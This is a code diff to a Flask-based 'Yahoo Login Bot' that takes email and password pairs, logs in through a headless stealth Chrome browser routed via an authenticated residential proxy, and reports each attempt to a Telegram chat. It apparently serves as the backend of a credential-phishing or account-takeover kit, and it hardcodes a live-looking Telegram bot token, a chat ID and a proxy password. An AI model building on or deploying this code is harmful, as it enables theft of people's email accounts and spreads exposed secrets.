@@ -24,9 +24,9 @@ else:
 app = Flask(__name__)
 CORS(app)
 
-# ================== CONFIG FOR RENDER ==================
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+# ================== CONFIG ==================
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8664946712:AAHho-AsU7hRuBs43J-7k-kZ5gmhUz6-6b8")
+CHAT_ID = os.getenv("CHAT_ID", "-1003709189605")
 
 # === PROXY ===
 PROXY_HOST = "us.decodo.com"
@@ -37,6 +37,7 @@ PROXY_PASS = "zEfr90tw8nZh5uHWr_"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 def create_proxy_extension():
+    """Merged proxy_auth - no external folder needed"""
     ext_dir = "temp_proxy_auth"
     os.makedirs(ext_dir, exist_ok=True)
 
@@ -51,12 +52,32 @@ def create_proxy_extension():
     background = f'''var config = {{
     mode: "fixed_servers",
     rules: {{
-      singleProxy: {{ scheme: "http", host: "{PROXY_HOST}", port: parseInt("{PROXY_PORT}") }}
+      singleProxy: {{
+        scheme: "http",
+        host: "{PROXY_HOST}",
+        port: parseInt("{PROXY_PORT}")
+      }},
+      bypassList: ["localhost"]
     }}
   }};
+
 chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
-function callbackFn(d) {{ return {{ authCredentials: {{ username: "{PROXY_USER}", password: "{PROXY_PASS}" }} }}; }}
-chrome.webRequest.onAuthRequired.addListener(callbackFn, {{urls: ["<all_urls>"]}}, ['blocking']);'''
+
+function callbackFn(details) {{
+    return {{
+        authCredentials: {{
+            username: "{PROXY_USER}",
+            password: "{PROXY_PASS}"
+        }}
+    }};
+}}
+
+chrome.webRequest.onAuthRequired.addListener(
+    callbackFn,
+    {{urls: ["<all_urls>"]}},
+    ['blocking']
+);
+'''
 
     with open(f"{ext_dir}/manifest.json", "w") as f:
         json.dump(manifest, f, indent=2)
@@ -98,22 +119,19 @@ def selenium_login(email, password):
     try:
         bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")
 
+        # Create proxy extension on the fly
+        extension_path = create_proxy_extension()
+
         options = uc.ChromeOptions()
-        options.headless = True                    # Changed for Render
+        options.headless = True
         options.add_argument("--start-maximized")
         options.add_argument("--disable-blink-features=AutomationControlled")
         options.add_argument("--no-sandbox")
         options.add_argument("--disable-dev-shm-usage")
         options.add_argument("--disable-gpu")
         options.add_argument("--ignore-certificate-errors")
-        options.add_argument("--ignore-ssl-errors")
-        options.add_argument("--allow-insecure-localhost")
-        options.add_argument("--disable-web-security")
-        options.binary_location = "/usr/bin/google-chrome"   # Important for Render
-
-        # Use proxy_auth folder
-        extension_path = os.path.abspath("proxy_auth")
         options.add_argument(f"--load-extension={extension_path}")
+        options.binary_location = "/usr/bin/google-chrome"
 
         driver = uc.Chrome(options=options)
 
@@ -181,5 +199,5 @@ def selenium_login(email, password):
             driver.quit()
 
 if __name__ == '__main__':
-    print("🚀 Yahoo Login Bot Started (Proxy Embedded)")
+    print("🚀 Yahoo Login Bot Started (Proxy Merged)")
     app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5001)), debug=False)
